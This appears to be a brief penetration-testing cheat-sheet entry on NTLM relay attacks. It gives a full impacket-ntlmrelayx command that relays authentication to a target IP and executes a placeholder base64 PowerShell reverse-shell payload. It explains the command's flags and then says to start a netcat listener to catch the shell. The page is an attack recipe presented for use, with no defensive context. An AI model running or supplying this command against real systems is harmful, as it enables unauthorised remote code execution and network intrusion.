# NTLM Relay

{% code overflow="wrap" %}
```
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.242 -c "{powershell base64 encoded payload}"
```
{% endcode %}

* &#x20;**--no-http-server**: disable HTTP server&#x20;
* **-smb2support**: enable SMB2 support
* **-t**: target IP
* **-c**: command
  * use revshell powershell base64 encoded payload

Set up netcat listener.



